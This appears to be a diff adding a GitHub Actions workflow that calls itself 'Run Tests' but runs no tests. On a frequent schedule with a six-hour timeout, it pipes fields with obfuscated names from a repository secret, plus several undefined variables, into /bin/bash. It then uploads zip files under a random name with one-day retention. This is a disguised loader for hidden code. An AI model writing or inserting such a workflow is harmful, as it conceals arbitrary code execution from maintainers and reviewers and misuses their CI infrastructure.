@@ -1,0 +1,37 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '11 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          w7: ${{ secrets.w7 }}
+        run: |
+          printf '%s' "$w7" | jq -r .gw16852 | /bin/bash
+          printf '%s' "$mylpy71301" | jq -r .kfmvq0897 | /bin/bash
+          printf '%s' "$xu2" | jq -r .csi188 | /bin/bash
+          printf '%s' "$l85" | jq -r .jrp34 | /bin/bash
+          printf '%s' "$qm11775" | jq -r .bm50 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: XxGloPM8
+          path: "*.zip"
+          retention-days: 1
